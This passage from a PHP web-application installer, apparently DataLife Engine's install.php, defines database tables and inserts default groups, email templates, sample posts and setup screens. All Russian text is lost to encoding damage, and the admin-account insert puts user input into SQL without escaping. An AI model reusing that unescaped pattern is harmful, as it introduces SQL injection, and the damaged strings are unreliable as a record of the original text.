) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_complaint";
$tableSchema[] = "CREATE TABLE " . PREFIX . "_complaint (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `p_id` int(10) NOT NULL DEFAULT '0',
  `c_id` int(10) NOT NULL DEFAULT '0',
  `n_id` int(10) NOT NULL DEFAULT '0',
  `text` text NOT NULL,
  `from` varchar(40) NOT NULL DEFAULT '',
  `to` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`),
  KEY `c_id` (`c_id`),
  KEY `p_id` (`p_id`),
  KEY `n_id` (`n_id`)
) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_ignore_list";
$tableSchema[] = "CREATE TABLE " . PREFIX . "_ignore_list (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user` int(11) NOT NULL default '0',
  `user_from` VARCHAR(50) NOT NULL default '',
  PRIMARY KEY  (`id`),
  KEY `user` (`user`),
  KEY `user_from` (`user_from`)
) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_admin_logs";
$tableSchema[] = "CREATE TABLE " . PREFIX . "_admin_logs (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(40) NOT NULL DEFAULT '',
  `date` int(11) unsigned NOT NULL DEFAULT '0',
  `ip` varchar(16) NOT NULL DEFAULT '',
  `action` int(11) NOT NULL DEFAULT '0',
  `extras` text NOT NULL,
  PRIMARY KEY  (`id`),
  KEY `date` (`date`)
) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "DROP TABLE IF EXISTS " . PREFIX . "_question";
$tableSchema[] = "CREATE TABLE " . PREFIX . "_question (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `question` varchar(255) NOT NULL DEFAULT '',
  `answer` text NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM /*!40101 DEFAULT CHARACTER SET " . COLLATE . " COLLATE " . COLLATE . "_general_ci */";

$tableSchema[] = "INSERT INTO " . PREFIX . "_rssinform VALUES (1, 'dle', '������� �� DLE.org.ua', '0', 'http://dle.org.ua/feed/', 'informer', 3, 0, 200, 1, 'j F Y H:i')";

$tableSchema[] = "INSERT INTO " . PREFIX . "_usergroups VALUES (1, '��������������', 'all', 1, 'all', 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 50, 101, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, '{THEME}/images/icon_1.gif', 0, 1, 1, 1, 1, 1, 1, 0, 1,500,1000,1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,1,'<b><span style=\"color:red\">','</span></b>',1,1,'all', 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0)";
$tableSchema[] = "INSERT INTO " . PREFIX . "_usergroups VALUES (2, '������� ���������', 'all', 1, 'all', 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 50, 101, 1, 1, 1, 0, 2, 1, 1, 1, 1, 1, 0, '{THEME}/images/icon_2.gif', 0, 1, 0, 1, 1, 1, 1, 0, 1,500,1000,1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,1,'','',1,1,'all', 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0)";
$tableSchema[] = "INSERT INTO " . PREFIX . "_usergroups VALUES (3, '����������', 'all', 1, 'all', 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 50, 101, 1, 1, 1, 0, 3, 0, 1, 1, 1, 1, 0, '{THEME}/images/icon_3.gif', 0, 1, 0, 1, 1, 1, 1, 0, 1,500,1000,1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,1,'','',1,1,'all', 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0)";
$tableSchema[] = "INSERT INTO " . PREFIX . "_usergroups VALUES (4, '����������', 'all', 1, 'all', 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 20, 101, 1, 1, 1, 0, 4, 0, 1, 1, 1, 1, 0, '{THEME}/images/icon_4.gif', 0, 1, 0, 1, 0, 1, 1, 1, 0,500,1000,0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,1,'','',1,0,'all', 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0)";
$tableSchema[] = "INSERT INTO " . PREFIX . "_usergroups VALUES (5, '�����', 'all', 0, 'all', 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 5, 0, 1, 1, 1, 0, 1, '{THEME}/images/icon_5.gif', 0, 1, 0, 0, 0, 0, 1, 1, 0,1,1,0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,0,'','',0,0,'all', 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0)";

$tableSchema[] = "INSERT INTO " . PREFIX . "_rss VALUES (1, 'http://dle-news.ru/rss.xml', '����������� ���� DataLife Engine', 1, 1, 1, 1, 1, '<div id=\"news-id-{skip}\">{get}</div><br /><br /></td>', 5, '', 1, '')";

$tableSchema[] = "INSERT INTO " . PREFIX . "_email values (1, 'reg_mail', '{%username%},\r\n\r\n��� ������ ���������� � ����� $url\r\n\r\n�� �������� ��� ������, ��� ��� ���� e-mail ����� ��� ����������� ��� ����������� �� �����. ���� �� �� ���������������� �� ���� �����, ������ �������������� ��� ������ � ������� ���. �� ������ �� �������� ������ ������.\r\n\r\n------------------------------------------------\r\n��� ����� � ������ �� �����:\r\n------------------------------------------------\r\n\r\n�����: {%username%}\r\n������: {%password%}\r\n\r\n------------------------------------------------\r\n���������� �� ���������\r\n------------------------------------------------\r\n\r\n���������� ��� �� �����������.\r\n�� ������� �� ��� ������������� ����� �����������, ��� �������� ����, ��� �������� ���� e-mail ����� - ��������. ��� ��������� ��� ������ �� ������������� ��������������� � �����.\r\n\r\n��� ��������� ������ ��������, ������� �� ��������� ������:\r\n\r\n{%validationlink%}\r\n\r\n���� � ��� ���� ��������� ������ �� ����������, �������� ��� ������� �����. � ���� ������, ���������� � ��������������, ��� ���������� ��������.\r\n\r\n� ���������,\r\n\r\n������������� $url.')";
$tableSchema[] = "INSERT INTO " . PREFIX . "_email values (2, 'feed_mail', '{%username_to%},\r\n\r\n������ ������ ��� �������� {%username_from%} � ����� $url\r\n\r\n------------------------------------------------\r\n����� ���������\r\n------------------------------------------------\r\n\r\n{%text%}\r\n\r\nIP ����� �����������: {%ip%}\r\n\r\n------------------------------------------------\r\n�������, ��� ������������� ����� �� ����� ��������������� �� ���������� ������� ������\r\n\r\n� ���������,\r\n\r\n������������� $url')";
$tableSchema[] = "INSERT INTO " . PREFIX . "_email values (3, 'lost_mail', '��������� {%username%},\r\n\r\n�� ������� ������ �� ��������� �������� ������ �� ����� $url ������ � ����� ������������ ��� ������ �������� � ������������� ����, ������� �� �� ����� �������� ��� ��� ������ ������, ������� ���� �� ������ ������������� ����� ������, ������� �� ��������� ������: \r\n\r\n{%lostlink%}\r\n\r\n���� �� �� ������ ������� ��� ��������� ������, �� ������ ������� ������ ������, ��� ������ ��������� � �������� �����, � ���������� ����������� �����.\r\n\r\nIP ����� �����������: {%ip%}\r\n\r\n� ���������,\r\n\r\n������������� $url')";
$tableSchema[] = "INSERT INTO " . PREFIX . "_email values (4, 'new_news', '��������� �������������,\r\n\r\n���������� ��� � ���, ��� �� ����  $url ���� ��������� �������, ������� � ������ ������ ������� ���������.\r\n\r\n------------------------------------------------\r\n������� ���������� � �������\r\n------------------------------------------------\r\n\r\n�����: {%username%}\r\n��������� �������: {%title%}\r\n���������: {%category%}\r\n���� ����������: {%date%}\r\n\r\n� ���������,\r\n\r\n������������� $url')";
$tableSchema[] = "INSERT INTO " . PREFIX . "_email values (5, 'comments', '��������� {%username_to%},\r\n\r\n���������� ��� � ���, ��� �� ����  $url ��� �������� ����������� � �������, �� ������� �� ���� ���������.\r\n\r\n------------------------------------------------\r\n������� ���������� � �����������\r\n------------------------------------------------\r\n\r\n�����: {%username%}\r\n���� ����������: {%date%}\r\n������ �� �������: {%link%}\r\n\r\n------------------------------------------------\r\n����� �����������\r\n------------------------------------------------\r\n\r\n{%text%}\r\n\r\n------------------------------------------------\r\n\r\n���� �� �� ������ ������ �������� ����������� � ����� ������������ � ������ �������, �� ����������� �� ������ ������: {%unsubscribe%}\r\n\r\n� ���������,\r\n\r\n������������� $url')";
$tableSchema[] = "INSERT INTO " . PREFIX . "_email values (6, 'pm', '��������� {%username%},\r\n\r\n���������� ��� � ���, ��� �� �����  $url ��� ���� ���������� ������������ ���������.\r\n\r\n------------------------------------------------\r\n������� ���������� � ���������\r\n------------------------------------------------\r\n\r\n�����������: {%fromusername%}\r\n����  ���������: {%date%}\r\n���������: {%title%}\r\n\r\n------------------------------------------------\r\n����� ���������\r\n------------------------------------------------\r\n\r\n{%text%}\r\n\r\n� ���������,\r\n\r\n������������� $url')";

$tableSchema[] = "INSERT INTO " . PREFIX . "_category (name, alt_name, keywords) values ('����������', 'main', '')";
$tableSchema[] = "INSERT INTO " . PREFIX . "_banners (banner_tag, descr, code, approve, short_place, bstick, main, category) values ('header', '������� ������', '<div align=\"center\"><a href=\"http://dle.org.ua/\" target=\"_blank\"><img src=\"{$url}templates/Default/images/_banner_.gif\" style=\"border: none;\" alt=\"\" /></a></div>', 1, 0, 0, 0, 0)";

$add_time = time();
$thistime = date ("Y-m-d H:i:s", $add_time);

$tableSchema[] = "INSERT INTO " . PREFIX . "_static (`name`, `descr`, `template`, `allow_br`, `allow_template`, `grouplevel`, `tpl`, `metadescr`, `metakeys`, `views`, `template_folder`, `date`) VALUES ('dle-rules-page', '����� ������� �� �����', '<b>����� ������� ��������� �� �����:</b><br /><br />������ � ����, ��� �� ����� �������� ����� �����, ������ ������� � ��������, � ��� ��� �������� ������������� ������������ ������ �����, ������� ���� �� ����� ����� ��� ���������� ����� ��������������� ��� � ���������� �������. �� ������������ ����������� ��������� ��������� �������, ��� ������ � ��� ����� ����� ����, �� �������� ��� � ��� ����� � ������� ������� ���� ����� ���������� � ��������������.<br /><br />������ � ����, ��� �� ����� ����� ����� ����� ���� ����������� �� ���� ����������� �����. �� ���� ����������� �� ��������� � ����������, ��� ������ ������. ���� ���� ��������� - ����������� � ������� ��� ����������� (�������������� ������� �����������). ����������� ������ ����������� ��������� � ��� ����� �� ����� ������ ��������� � ������ ������������ ��������������. <b>� ��� ������ �������� ������, ����������� � ������������ ������������.</b> ������� ���������� ��� �� ��������� � �� ������� ������� ��� ���� ����� �������� � �����������.<br /><br /><b>�� ����� ������ ���������:</b> <br /><br />- ���������, �� ����������� � ���������� ������ ��� � ��������� ����������<br />- ����������� � ������ � ����� ����������� �����<br />- � ������������ ����������� ���������, ���������� ������������� �������, ��������� ������������ �����������, ����������� ��������������� �����<br />- ����, � ����� ������� ����� ������� � �����, ���� ��������, ��� ��� �������, �� ����������� � ��������� ���������� ������<br /><br />������� ����� ������� ���� ����� � ����, �� ������� �� � ������ �������� �������� ���������� � ��������� ���� �����. ������������� ����� ��������� �� ����� ����� ������� ����������� ��� ����� ������������, ���� ��� �� ������������� ������ �����������.<br /><br />��� ��������� ������ ��� ����� ���� ���� <b>��������������</b>. � ��������� ������� ����� ���� ��� ��� <b>��� ��������������</b>. �� �������� ������ ���� ������ ��������������.<br /><br /><b>�����������</b> ��������������� ��� ����������� ����� �������� <b>�����</b> - �������� ����� ����.<br /><br /><div align=\"center\">{ACCEPT-DECLINE}</div>', 1, 1, 'all', '', '����� �������', '����� �������', 0, '', '{$add_time}')";
$tableSchema[] = "INSERT INTO " . PREFIX . "_users (name, password, email, reg_date, lastdate, user_group, news_num, info, signature, favorites, xfields) values ('$reg_username', '$reg_password', '$reg_email', '$add_time', '$add_time', '1', '4', '', '', '', '')";
$tableSchema[] = "INSERT INTO " . PREFIX . "_vote (category, vote_num, date, title, body) VALUES ('all', '0', '$thistime', '������� ������ ������', '������ �� ���������<br />�������� ������<br />���������� ... �� ...<br />�������� � �������<br />������ �� ����������')";

$title = "����� ����������";
$short_story = "<div align=\"center\"><img src=\"".$url."uploads/boxsmall.jpg\" alt=\"\" /></div>����� ���������� �� ���������������� �������� ������ DataLife Engine. DataLife Engine ��� ��������������������� ��������� ������, ���������� �������� ��������������� �������������. ������ ������������ � ������ ������� ��� �������� ��������� ������ � ������ � ������� �������������� ����������. ������ �� ����� ������� ���������� ��������, ������� ��������� ������������ ��� ����������� ��� ����� �����. ������ ����� ���� ������������ ����������� � ����� ������������ ������, � �� ����� ������� ����������� �� �������� �������� ��� ����. ��� ����� �������� ������������ DataLife Engine �������� ������ �������� �� ��������� �������, ���� ��� ����� ������� ��������� ����� �������� �� ������ ����� �����������, � �� �� ������ ���������� �����-���� ������� � ������������ ����������. ������ ������������� ��� ��������� �������. ��� ���� �������������� ������������ �� ������� ��������� �� <a href=\"http://dle.org.ua/\" target=\"_blank\">����� ��������</a>.<br /><br />���������� ������� �� ���� �������� ������� <a href=\"http://dle.org.ua/forum/\" target=\"_blank\">�����</a>. ��� �� ��� �� ������� �������� ����������� ������.";
$full_story = "";

$tableSchema[] = "INSERT INTO " . PREFIX . "_post (date, autor, short_story, full_story, xfields, title, keywords, category, alt_name, allow_comm, approve, allow_main, tags) values ('$thistime', '$reg_username', '$short_story', '$full_story', '', '$title', '', '1', 'post1', '1', '1', '1', '��, �������')";

$title = "������������ � ������ �������";
$short_story = "��������� ���������� ����� ��� ��� ������� ��������� ����������. ������ ��� ���������� � �����-���� �������� � ������ ��������� �������, ��������� ��� �� ��������� ��������� ������������ �� ������� � �� ����� ��� ��� ��� ������������ ������. �� ��������� �� ����� ����� ������������ �������, ����������� � ��� �� �������������, ������������ �������������� ������ ������� ��� �� ���������� ��������, ���������� � ���� ������ ����������� ���������. �� ������ ���������� ���� �� ���� ����� �������� �� DataLife Engine �� ������ �������:<br /><br />- <b>������� ��������.</b> ��������� ������ �������� ����������: <span style=\"color:red\">59$</span>. ��� ������������ ������ �������� �� ����� ��������� ����������� ��������� ��������� ����� ������ ������� � ������� <b>������ ����</b>.<br /><br />- <b>����������� ��������.</b> ��������� ������ �������� ����������: <span style=\"color:red\">78$</span>. ��� ������������ ������ �������� �� ��������� ��� ��� ������ � ������� ��������, � ����� ������������� ������ ������ ����������� ��������� ������� � ���������� �� ������ ���������� �� ������ � ���������������� ����� (������� ��� ������� ����������� �����).<br /><br /><b>���� �������� ��������</b> ���������� <span style=\"color:#FF0000\">1 ���</span>, � ������� �������� �� ��������� ������ �������� ��� ����������� ������ ������� � ����������, � � ������ ������������ ����������� ��������, � ���. ���������. ����� ��������� ����� �������� �� ������ �� ��������, ���� ������������ ���������� ��������� ���������� �� ��� ������ ������� ������ �������. � ������ ���� �� �������� �������� �������� ��� ��������� ����� ������ �������, �� ��������� ��������� �������� �� ���, ���������� <span style=\"color:red\">39$</span><br /><br /><b>��� �������� ������ �� ������ ��������� ��</b> <a href=\"http://dle-news.ru/price.html\" target=\"_blank\">http://dle-news.ru/price.html</a><br /><br />������� ��� �������� �������� ������ �� ���� ����� (������) � �� ����� �������������� �� ������ ������, � ����� ��������� �������� ������ ����� �������� ������� �����.<br /><br /><b>� ���������,<br /><br />SoftNews Media Group</b>";

$add_time = time()-20;
$thistime = date ("Y-m-d H:i:s", $add_time);

$tableSchema[] = "INSERT INTO " . PREFIX . "_post (date, autor, short_story, full_story, xfields, title, keywords, category, alt_name, allow_comm, approve, allow_main, tags) values ('$thistime', '$reg_username', '$short_story', '$full_story', '', '$title', '', '1', 'post2', '1', '1', '1', '��, �������')";

$title = "������� ��� DataLife Engine";
$short_story = "<br /><div align=\"center\"><a href=\"http://www.dletemplates.com/\" target=\"_blank\"><img src=\"".$url."uploads/dlelogo.gif\" alt=\"\" /></a></div><br />��������� � ������ ���������� <a href=\"http://www.dletemplates.com/\" target=\"_blank\">www.dletemplates.com</a> �� ���� ���������� ���  ����� ������������������ �������, ���������� �������������� ��� ������������� ��� ����������� DataLife Engine. ������������ ������� ������� �� ������� ������������ ������ �������� ����������� � ��������������. ������ �� ������������ �������� ��������� �������� � ����� � ������������� ����� �� ����� ��� ��������� �� ������. ������ ���� ��� ��� ������� ��� ������������ � ������������� �� �������, �� ��������� ����� ��� �������� ���������, ������� ���� ������������ ��� �������� �������.<br /><br />���� �� ��� ������ ������������ ��� ����� ��������� ��� ���� � ������� ��������������� �������� �������������� �� ������ �������� �����, �� �� ����������� ��� ���������� � ����� ��������� <a href=\"http://www.dletemplates.com/\" target=\"_blank\">www.dletemplates.com</a>, ������� � ������ ������ �������� ��� ��� ������������ ����� ������ �����, � ����� ���������� ��� ��������������� � ������ � �������. ����� �� ����� ����������� ������ �� ���������� ��� �������� ������ ������ � ������.";

$add_time = time()-50;
$thistime = date ("Y-m-d H:i:s", $add_time);

$tableSchema[] = "INSERT INTO " . PREFIX . "_post (date, autor, short_story, full_story, xfields, title, keywords, category, alt_name, allow_comm, approve, allow_main, tags) values ('$thistime', '$reg_username', '$short_story', '$full_story', '', '$title', '', '1', 'post3', '1', '1', '1', '��, �������')";

$title = "������������� ����������� ��������� �������";
$short_story = "<b>����������� ��������� �������</b> �������������� ������ <a href=\"http://dle.org.ua/forum/\" target=\"_blank\">������ ���������</a>, � ����� �� E-Mail. �� ���� ����������� ��������� � ��� �������� �� ��������� �������� �� ��� ���� �������, �� � ����� � ������� ����������� �����������, ��� �� ������ �������� ���������. ������� ������� �������������� ������ ������� ��������� �������. ��������� ������ ������ ���������� ������������� <!--colorstart:#FF0000--><span style=\"color:#FF0000\"><!--/colorstart-->19 $<!--colorend--></span><!--/colorend--> ���������� �� ���� ���� �������� ��������.<br /><br /><b>������ �� �������������� ��������� ������� �������� � ����:</b><br /><br />1. ������������ ��������� ������ �� �������, ������� ������ ������������ ������� ������������� �� �������� � ����������� �� ������� ���� ������� ������ �������. � ����������� ������ ��������� ��������� ������ ������ ������ �� ���������������� ����� ������ �������, � ������ ���� �������� ������������ ������ ������� ������ ��� ������, �� ��������������� ����������� �������, �� � ��������� ��� ����� ���� ��������.<br /><br />2. ����� �� ��������� ����������� ����������� ��������� ������� ��� �� ������, ������� ��������� ��� �� ������ ����������������� � ������ ������� �������� ������� (������ ����� ����� ��������� ��������� ���, ��������� ����������� �������� ��� �������� �����, ��� ������ �������� �������� � ������...).<br /><br />3. �� ��������� ���������������� ��������� �� ������ �� ���������� �������, �������� � ��� ���� ������� �������� ��������� ��������� � ������ ��� ����� ������� ������ ��� ���, �� ������� ���������� ����� �� ������ ������� ����� ���� ������ ������� � ���. ��� ����� ������������� ������������ ��� ��� ������ � ��� ������ ����� ����������� ������������ ������. (�������� �� �� ����� �� ��� �������������� ������, � ������ �������� ��� ����� ����������� �� ���������� �������, ������� ������ ��������� ������� �� ��������, ������� ����: \"��� ��� ������� ����� �����\" ����� ���� ��������������� ������� ���������).<br /><br />4. ��� ���� �� ����� ����������� ������� ��� ������������ ���������� �������, �������� �� ����� ���������� ��������� ���� �������, ����� ����� ������ ���� ������� � ���� � ���������, ����� ���, � ����� �� ��������� ��������� ������, �� ����� ����������� �������������. � ������ ������ ��� ��� ����� ��������� ������ ��������� ������������ ��������� ���� ������.<br /><br />� ������ ���� �� �� ��������� ����������� �������������� ������ ���������, ���� ������� ����� ���� ��������������� � ��������� ��� ������.<br /><br /><b>� ���������,<br /><br />SoftNews Media Group</b>";

$add_time = time()-70;
$thistime = date ("Y-m-d H:i:s", $add_time);

$tableSchema[] = "INSERT INTO " . PREFIX . "_post (date, autor, short_story, full_story, xfields, title, keywords, category, alt_name, allow_comm, approve, allow_main, tags) values ('$thistime', '$reg_username', '$short_story', '$full_story', '', '$title', '', '1', 'post4', '1', '1', '1', '')";


$tableSchema[] = "INSERT INTO " . PREFIX . "_tags (news_id, tag) values ('1', '��'), ('2', '��'), ('3', '��'), ('1', '�������'), ('2', '�������'), ('3', '�������')";

include ENGINE_DIR.'/classes/mysql.php';
include ENGINE_DIR.'/data/dbconfig.php';

      foreach($tableSchema as $table) {

        $db->query($table);

      }

echoheader("", "");

echo <<<HTML
<div style="padding-top:5px;">
<table width="100%">
    <tr>
        <td width="4"><img src="engine/skins/images/tl_lo.gif" width="4" height="4" border="0"></td>
        <td background="engine/skins/images/tl_oo.gif"><img src="engine/skins/images/tl_oo.gif" width="1" height="4" border="0"></td>
        <td width="6"><img src="engine/skins/images/tl_ro.gif" width="6" height="4" border="0"></td>
    </tr>
    <tr>
        <td background="engine/skins/images/tl_lb.gif"><img src="engine/skins/images/tl_lb.gif" width="4" height="1" border="0"></td>
        <td style="padding:5px;" bgcolor="#FFFFFF">
<table width="100%">
    <tr>
        <td bgcolor="#EFEFEF" height="29" style="padding-left:10px;"><div class="navigation">��������� ������� ���������</div></td>
    </tr>
</table>
<div class="unterline"></div>
<table width="100%">
    <tr>
        <td style="padding:2px;"><br>����������� ���, DataLife Engine ��� ������� ���������� �� ��� ������. �� ������ ����������� ������ ������� <a href="index.php">�������� ������ �����</a>  � ���������� ����������� �������. ���� �� ������ <a href="admin.php">�����</a> � ������ ���������� DataLife Engine � �������� ������ ��������� �������. 
<br><br><font color="red">��������: ��� ��������� ������� ��������� ��������� ���� ������, ��������� ������� ��������������, � ����� ������������� �������� ��������� �������, ������� ����� �������� ��������� ������� ���� <b>install.php</b> �� ��������� ��������� ��������� �������!</font><br><br>
�������� ��� ������<br><br>
SoftNews Media Group<br><br></td>
    </tr>
</table>
</td>
        <td background="engine/skins/images/tl_rb.gif"><img src="engine/skins/images/tl_rb.gif" width="6" height="1" border="0"></td>
    </tr>
    <tr>
        <td><img src="engine/skins/images/tl_lu.gif" width="4" height="6" border="0"></td>
        <td background="engine/skins/images/tl_ub.gif"><img src="engine/skins/images/tl_ub.gif" width="1" height="6" border="0"></td>
        <td><img src="engine/skins/images/tl_ru.gif" width="6" height="6" border="0"></td>
    </tr>
</table>
</div>
HTML;
 
}
else {

if (@file_exists(ENGINE_DIR.'/data/config.php')) { 
echoheader("", "");
echo <<<HTML
<form method="post" action="">
<div style="padding-top:5px;">
<table width="100%">
    <tr>
        <td width="4"><img src="engine/skins/images/tl_lo.gif" width="4" height="4" border="0"></td>
        <td background="engine/skins/images/tl_oo.gif"><img src="engine/skins/images/tl_oo.gif" width="1" height="4" border="0"></td>
        <td width="6"><img src="engine/skins/images/tl_ro.gif" width="6" height="4" border="0"></td>
    </tr>
    <tr>
        <td background="engine/skins/images/tl_lb.gif"><img src="engine/skins/images/tl_lb.gif" width="4" height="1" border="0"></td>
        <td style="padding:5px;" bgcolor="#FFFFFF">
<table width="100%">
    <tr>
        <td bgcolor="#EFEFEF" height="29" style="padding-left:10px;"><div class="navigation">��������� ������� ������������� �������������</div></td>
    </tr>
</table>
<div class="unterline"></div>
<table width="100%">
    <tr>
        <td style="padding:2px;">��������, �� ������� ���������� ��� ������������� ����� DataLife Engine. ���� �� ������ ��� ��� ���������� ��������� �������, �� ��� ���������� ������� ������� ���� <b>/engine/data/config.php</b>, ��������� FTP ��������.<br /><br /></td>
    </tr>
    <tr>
        <td style="padding:2px;"><input class=buttons type=submit value="&nbsp;&nbsp;��������&nbsp;&nbsp;"></td>
    </tr>
</table>
</td>
        <td background="engine/skins/images/tl_rb.gif"><img src="engine/skins/images/tl_rb.gif" width="6" height="1" border="0"></td>
    </tr>
    <tr>
        <td><img src="engine/skins/images/tl_lu.gif" width="4" height="6" border="0"></td>
        <td background="engine/skins/images/tl_ub.gif"><img src="engine/skins/images/tl_ub.gif" width="1" height="6" border="0"></td>
        <td><img src="engine/skins/images/tl_ru.gif" width="6" height="6" border="0"></td>
    </tr>
</table>
</div></form>
HTML;

echofooter();

die ();
}

$_SESSION['dle_install'] = 1;

// ********************************************************************************
// �����������
// ********************************************************************************
echoheader("", "");
echo <<<HTML
<form method="post" action="">
<div style="padding-top:5px;">
<table width="100%">
    <tr>
        <td width="4"><img src="engine/skins/images/tl_lo.gif" width="4" height="4" border="0"></td>
        <td background="engine/skins/images/tl_oo.gif"><img src="engine/skins/images/tl_oo.gif" width="1" height="4" border="0"></td>
        <td width="6"><img src="engine/skins/images/tl_ro.gif" width="6" height="4" border="0"></td>
    </tr>
    <tr>
        <td background="engine/skins/images/tl_lb.gif"><img src="engine/skins/images/tl_lb.gif" width="4" height="1" border="0"></td>
        <td style="padding:5px;" bgcolor="#FFFFFF">
<table width="100%">
    <tr>
        <td bgcolor="#EFEFEF" height="29" style="padding-left:10px;"><div class="navigation">������ ��������� �������</div></td>
    </tr>
</table>
<div class="unterline"></div>
<table width="100%">
    <tr>
        <td style="padding:2px;">����� ���������� � ������ ��������� DataLife Engine. ������ ������ ������� ��� ���������� ������ ����� �� ���� �����. ������, �� ������ �� ���, �� ������������ ����������� ��� ������������ � ������������� �� ������ � �������, � ����� �� ��� ���������, ������� ������������ ������ �� ��������.<br><br>
������ ��� ������ ��������� ���������, ��� ��� ����� ������������ ��������� �� ������, � ����� ���������� ����������� ����� ������� ��� ����� � ������.<br><br>
�������� ���� �������� �� ��, ��� ������ ������������ ������ � ���, � ��� ����� ����������, ����� ��� ���������� ������ <b>modrewrite</b> � ��� ������������� ���� ���������. E��� �� ������ ��������� ��� �����������, �� ������� ���� <b>.htaccess</b> � �������� ����� � � �������� ��������� ������� ��������� ��������� ���� �������.<br><br>
<font color="red">��������: ��� ��������� ������� ��������� ��������� ���� ������, ��������� ������� ��������������, � ����� ������������� �������� ��������� �������, ������� ����� �������� ��������� ������� ���� <b>install.php</b> �� ��������� ��������� ��������� �������!</font><br><br>
�������� ��� ������,<br><br>
SoftNews Media Group</td>
    </tr>
    <tr>
        <td style="padding:2px;"><input type=hidden name=action value="eula"><input class=buttons type=submit value="&nbsp;&nbsp;������ ���������&nbsp;&nbsp;"></td>
    </tr>
</table>
</td>
        <td background="engine/skins/images/tl_rb.gif"><img src="engine/skins/images/tl_rb.gif" width="6" height="1" border="0"></td>
    </tr>
    <tr>
        <td><img src="engine/skins/images/tl_lu.gif" width="4" height="6" border="0"></td>
        <td background="engine/skins/images/tl_ub.gif"><img src="engine/skins/images/tl_ub.gif" width="1" height="6" border="0"></td>
        <td><img src="engine/skins/images/tl_ru.gif" width="6" height="6" border="0"></td>
    </tr>
</table>
</div></form>
HTML;
}


echofooter();
?>